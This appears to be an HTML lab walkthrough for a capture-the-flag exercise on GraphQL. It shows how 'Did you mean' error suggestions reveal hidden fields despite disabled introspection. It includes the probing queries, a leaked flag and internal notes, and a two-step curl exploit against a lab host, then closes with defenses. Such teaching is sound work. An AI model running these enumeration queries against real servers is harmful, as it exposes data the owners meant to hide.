<!-- Introduction -->
<p>
    Although introspection is disabled, GraphQL servers often return "Did you mean..."
    suggestions in error messages when invalid but close-matching field names are queried.
    These suggestions reveal hidden field names, effectively bypassing the introspection ban.
</p>

<h4>Step 1: Confirm Introspection is Disabled</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Introspection Blocked</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Query: </span>{ __schema { types { name } } }<br>
        <span class="prompt">Error: </span>"GraphQL introspection is not allowed by Apollo Server"
    </div>
</div>

<h4>Step 2: Trigger Field Suggestions</h4>
<p>
    Query field names that are close (but not exact) matches for potential hidden fields.
    The server suggests the correct field names in error messages.
</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2a. Try "secretFla"</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Query: </span>{ user(id: 1) { id secretFla } }<br>
        <span class="prompt">Error: </span>Cannot query field "secretFla" on type "User". Did you mean "<strong>secretFlag</strong>"?
    </div>
</div>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2b. Try "internalNote"</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Query: </span>{ user(id: 1) { id internalNote } }<br>
        <span class="prompt">Error: </span>Cannot query field "internalNote" on type "User". Did you mean "<strong>internalNotes</strong>"?
    </div>
</div>
<p>
    The error messages reveal two hidden fields: <code>secretFlag</code> and
    <code>internalNotes</code>.
</p>

<h4>Step 3: Query the Hidden Fields</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. Extract Flag</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Query: </span>{ user(id: 1) { id username email secretFlag internalNotes } }<br><br>
        <span class="prompt">Response:</span><br>
        {<br>
        &nbsp;&nbsp;"data": {<br>
        &nbsp;&nbsp;&nbsp;&nbsp;"user": {<br>
        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"id": 1,<br>
        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"username": "alice",<br>
        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"email": "alice@example.com",<br>
        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"secretFlag": "<strong>FLAG{gq_f13ld_sugg3st10n}</strong>",<br>
        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"internalNotes": "Alice has admin access to staging"<br>
        &nbsp;&nbsp;&nbsp;&nbsp;}<br>
        &nbsp;&nbsp;}<br>
        }
    </div>
</div>

<h4>Step 4: Submit the Flag</h4>
<p>
    Copy the flag: <code>FLAG{gq_f13ld_sugg3st10n}</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Full Exploit</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Step 1: </span>curl -s -X POST http://target:4000/graphql/lab2 \<br>
        &nbsp;&nbsp;-H "Content-Type: application/json" \<br>
        &nbsp;&nbsp;-d '{"query":"{ user(id: 1) { id secretFla } }"}'<br>
        <span class="prompt">// Error: Did you mean "secretFlag"?</span><br><br>
        <span class="prompt">Step 2: </span>curl -s -X POST http://target:4000/graphql/lab2 \<br>
        &nbsp;&nbsp;-H "Content-Type: application/json" \<br>
        &nbsp;&nbsp;-d '{"query":"{ user(id: 1) { id username secretFlag } }"}'<br>
        <span class="prompt">// Returns FLAG{gq_f13ld_sugg3st10n}</span>
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> Disabling introspection alone is insufficient for hiding
    schema fields. GraphQL's "Did you mean..." field suggestions in error messages leak
    valid field names when close-matching invalid names are queried. In this lab,
    querying <code>secretFla</code> revealed <code>secretFlag</code>, and
    <code>internalNote</code> revealed <code>internalNotes</code>. Defense: disable
    field suggestions in error messages (use <code>graphql-armor</code> or custom error
    formatters), implement field-level authorization, and remove truly sensitive fields
    from the schema entirely.
</div>
